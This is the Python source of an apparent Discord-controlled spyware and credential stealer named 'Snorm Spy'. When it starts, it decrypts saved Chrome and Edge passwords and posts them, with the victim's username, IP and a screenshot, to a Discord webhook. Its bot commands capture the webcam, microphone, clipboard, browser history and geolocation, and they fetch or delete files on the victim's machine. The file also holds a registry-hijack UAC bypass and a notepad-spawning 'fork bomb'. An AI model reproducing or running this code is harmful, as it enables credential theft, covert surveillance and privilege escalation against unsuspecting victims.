import os
import socket
import io
import json
import sqlite3
import shutil
import requests
from Crypto.Cipher import AES
import discord
from discord.ext import commands
import win32crypt
import base64
import logging
import asyncio
from PIL import ImageGrab
import cv2
import pyperclip
import ctypes
import win32com.client
import subprocess
import sys
import ctypes
import uuid
from PIL import Image  
import pynput
import pyaudio
import wave
import threading

logging.getLogger('discord').setLevel(logging.CRITICAL)

async def spam_injecting():
    while True:
        print("INJECTING.... injecting... INJECTING..")
        await asyncio.sleep(0.1)

TOKEN = 'sex'
WEBHOOK_URL = 'sex'

intents = discord.Intents.default()
intents.message_content = True  

bot = commands.Bot(command_prefix="!", intents=intents)

FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024
RECORD_SECONDS = 30
AUDIO_FILE = "mic.wav"

def record_audio():
    """Function to record audio."""
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS,
                    rate=RATE, input=True,
                    frames_per_buffer=CHUNK)

    frames = []

    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    with wave.open(AUDIO_FILE, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

def get_encryption_key(browser="chrome"):
    try:
        if browser == "chrome":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        elif browser == "edge":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
        elif browser == "brave":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
        elif browser == "opera":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
        elif browser == "opera_gx":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")
        elif browser == "vivaldi":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data", "Local State")
        else:
            raise ValueError("Unsupported browser specified")

        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        decrypted_key = decrypt_master_key(encrypted_key)

        if decrypted_key:
            return decrypted_key
        else:
            return None
    except Exception as e:
        return None

def decrypt_master_key(encrypted_key):
    try:
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        return None

def decrypt_password_chrome(ciphertext, key):
    try:
        iv = ciphertext[3:15]  
        auth_tag = ciphertext[-16:]
        encrypted_data = ciphertext[15:-16]

        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(encrypted_data, auth_tag)

        return decrypted.decode("utf-8")
    except Exception as e:
        return None

def get_passwords_from_browser(browser="chrome"):
    key = get_encryption_key(browser)
    if not key:
        return {}

    paths = {
        "chrome": ["Google", "Chrome"],
        "edge": ["Microsoft", "Edge"],
        "brave": ["BraveSoftware", "Brave-Browser"],
        "vivaldi": ["Vivaldi", "Vivaldi"],
    }

    if browser in paths:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", paths[browser][0], paths[browser][1], "User Data", "Default", "Login Data")
    elif browser == "opera":
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
    elif browser == "opera_gx":
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data")
    else:
        raise ValueError("Unsupported browser specified")

    if not os.path.exists(db_path):
        return {}

    file_name = "LoginData.db"
    shutil.copyfile(db_path, file_name)

    db = sqlite3.connect(file_name)
    cursor = db.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    result = {}
    for row in cursor.fetchall():
        action_url = row[0]
        username = row[1]
        password = decrypt_password_chrome(row[2], key)

        if username and password:
            result[action_url] = [username, password]

    cursor.close()
    db.close()
    os.remove(file_name)
    return result

    
def addinfo():
    sillyname = os.getlogin()
    hostname = socket.gethostname()
    ipad = socket.gethostbyname(hostname)
    
    return sillyname, ipad

    
def grabscreen():
    screenshot = ImageGrab.grab()
    return screenshot
    
def grabscreenbytes(screenshot):
    ssba = io.BytesIO()
    screenshot.save(ssba, format='PNG')
    return ssba.getvalue()

@bot.event
async def on_ready():
    try:
        sillyname, ipad = addinfo()
        
        chrome_data = get_passwords_from_browser("chrome")
        edge_data = get_passwords_from_browser("edge")
        
        screenshot = grabscreen()
        screenshot_bytes = grabscreenbytes(screenshot)
        
        stolen_data = {**chrome_data, **edge_data}

        if stolen_data:
            print(f".....")
            
            image_url = "https://media.discordapp.net/attachments/1335780021817573499/1335825951249924207/313dddddd.png?ex=67a1945d&is=67a042dd&hm=199dca0c5f43187ccbe47d49dbe2c086b61157462878b7d09833fa0ee16aaf48&=&format=webp&quality=lossless"

            payload = {
                "embeds": [
                    {
                        "title": f"Data from {sillyname} ({ipad})",  
                        "description": f"**__Stolen Data__\n```json\n{stolen_data}```**",  
                        "url": "https://github.com/UnsillyHaxor",  
                        "color": 16711680,  
                        "footer": {
                            "text": "Grabbed by Snorm Spy | https://github.com/UnsillyHaxor | https://github.com/S-illy"  
                        },
                        "thumbnail": {
                            "url": image_url  
                        },
                        "image": {
                            "url": "attachment://screenshot.png"  # Forgot to put the comment as english
                        }
                    }
                ],
                "username": "Snorm Spy",  
                "avatar_url": image_url  
            }


            response = requests.post(WEBHOOK_URL, json=payload)

            if response.status_code == 204:
                print("Injecting..")
            else:
                print(f"Injection failed.")
        else:
            print("No passwords found to inject too...")

    except Exception as e:
        print(f"Error during on_ready: {e}")

@bot.command()
async def screenshot(ctx):
    try:
        screenshot = grabscreen()
        screenshot_bytes = grabscreenbytes(screenshot)

        await ctx.send(
            content="Here is the screenshot!",
            files=[discord.File(io.BytesIO(screenshot_bytes), filename="screenshot.png")]
        )

    except Exception as e:
        await ctx.send(f"Error: {e}")
@bot.command()
async def webcam(ctx):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()

        if not ret:
            await ctx.send("Can't access webcam")
            return

        _, img_encoded = cv2.imencode('.png', frame)
        img_bytes = img_encoded.tobytes()

        await ctx.send(
            content="See da pretty face",
            files=[discord.File(io.BytesIO(img_bytes), filename="webcam.png")]
        )

    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def clipboard(ctx):
    try:
        clipboard_content = pyperclip.paste()  # Get copeid thing
        
        if not clipboard_content:
            await ctx.send("Clipboard is empty.")
        else:
            await ctx.send(f"Clipboard content:\n```\n{clipboard_content}\n```")

    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def ip(ctx):
    try:
        
        response = requests.get("http://ip-api.com/json/").json()

        if response["status"] == "success":
            ip_info = (
                f"**Public IP:** {response['query']}\n"
                f"**Country:** {response['country']}\n"
                f"**Region:** {response['regionName']}\n"
                f"**City:** {response['city']}\n"
                f"**ISP:** {response['isp']}\n"
                f"**Lat/Lon:** {response['lat']}, {response['lon']}"
            )
        else:
            ip_info = "Failed to get IP info."

        
        payload = {"content": f"🔍 **IP Geolocation Report**\n{ip_info}"}
        requests.post(WEBHOOK_URL, json=payload)

        await ctx.send("Sent IP to webhook")

    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def tts(ctx, *, message: str):
    os.system(f"powershell -c (New-Object -ComObject SAPI.SpVoice).Speak('{message}')")
    await ctx.send("Message spoken.")

def get_browser_history(browser_name):
    try:
        
        browser_paths = {
    "Chrome": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Google\Chrome\User Data\Default\History"),
    "Edge": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Microsoft\Edge\User Data\Default\History"),
    "Brave": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"),
    "Vivaldi": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Vivaldi\User Data\Default\History"),
    "Opera": os.path.join(os.environ["USERPROFILE"], r"AppData\Roaming\Opera Software\Opera Stable\History"),
    "Opera GX": os.path.join(os.environ["USERPROFILE"], r"AppData\Roaming\Opera Software\Opera GX Stable\History"),
        }

        if browser_name not in browser_paths:
            return f"Unsupported browser: {browser_name}"

        history_db = browser_paths[browser_name]

        if not os.path.exists(history_db):
            return f"{browser_name} history file not found."

        
        temp_db = f"temp_{browser_name.lower()}_history.db"
        shutil.copy2(history_db, temp_db)

        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        
        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
        history = cursor.fetchall()

        conn.close()
        os.remove(temp_db)  

        if not history:
            return f"No browsing history found for {browser_name}."

        
        history_text = "\n".join([f"🔗 {title} ({url})" for url, title in history])
        return f"**Last 10 Browsed Sites on {browser_name}:**\n{history_text}"

    except Exception as e:
        return f"Error retrieving {browser_name} history: {e}"

@bot.command()
async def browser(ctx):
    chrome_history = get_browser_history("Chrome")
    edge_history = get_browser_history("Edge")
    brave_history = get_browser_history("Brave")
    vivaldi_history = get_browser_history("Vivaldi")
    opera_history = get_browser_history("Opera")
    opera_gx_history = get_browser_history("Opera GX")
    
    file_name = "SillySnormBrowserSpy.txt"
    with open(file_name, "w", encoding="utf-8") as file:
        file.write(chrome_history)
        file.write(edge_history)
        file.write(brave_history)
        file.write(vivaldi_history)
        file.write(opera_history)
        file.write(opera_gx_history)

    await ctx.send(file=discord.File(file_name))
@bot.command()
async def download(ctx, file_path: str):
    try:
        
        if os.path.exists(file_path):
            
            await ctx.send(file=discord.File(file_path))
            await ctx.send(f"File '{file_path}' sent successfully!")
        else:
            await ctx.send(f"File '{file_path}' does not exist.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def delete(ctx, file_path: str):
    try:
        
        if os.path.exists(file_path):
            
            os.remove(file_path)
            await ctx.send(f"File '{file_path}' has been deleted successfully.")
        else:
            await ctx.send(f"File '{file_path}' does not exist.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def forkbomb(ctx):
    for _ in range(1000):
        subprocess.Popen(['notepad.exe'])
    await ctx.send('Executed fork bomb..')

def UACbypass(method: int = 1) -> bool:
    if GetSelf()[1]:
        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
        if method == 1:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("computerdefaults --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        elif method == 2:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("fodhelper --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        else:
            return False
        return True

def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

def GetSelf() -> tuple[str, bool]:
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)

@bot.command()
async def hwid(ctx):
    
    hwid = uuid.UUID(int=uuid.getnode()).hex
    await ctx.send(f"Victim HWID : {hwid}")

@bot.command()
async def jumpscare(ctx):
    """Displays an image on the user's screen."""

    
    image_url = "https://github.com/UnsillyHaxor/Snorm-Spy-Discord-Stealer-/blob/main/scarylarry.png?raw=true"

    
    response = requests.get(image_url)
    if response.status_code == 200:
        image = Image.open(io.BytesIO(response.content))

        
        temp_path = os.path.join(os.environ["TEMP"], "jumpscare.png")
        image.save(temp_path)

        
        image.show()

        await ctx.send("Jumpscare image has been displayed!")
    else:
        await ctx.send("Failed to load the image.")

@bot.command()
async def invite(ctx):
    invite_link = discord.utils.oauth_url(bot.user.id)
    await ctx.send(f"Hehe: {invite_link}")


FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024
RECORD_SECONDS = 30  
AUDIO_FILE = "mic.wav"

@bot.command()
async def mic(ctx):
    
    await ctx.send("Recording their MIC")

    
    thread = threading.Thread(target=record_audio)
    thread.start()

    
    thread.join()  

    
    if os.path.exists(AUDIO_FILE):
        await ctx.send("Sending file..")
        await ctx.send(file=discord.File(AUDIO_FILE))

        
        os.remove(AUDIO_FILE)
    else:
        await ctx.send("No audio file was created.")


bot.run(TOKEN)
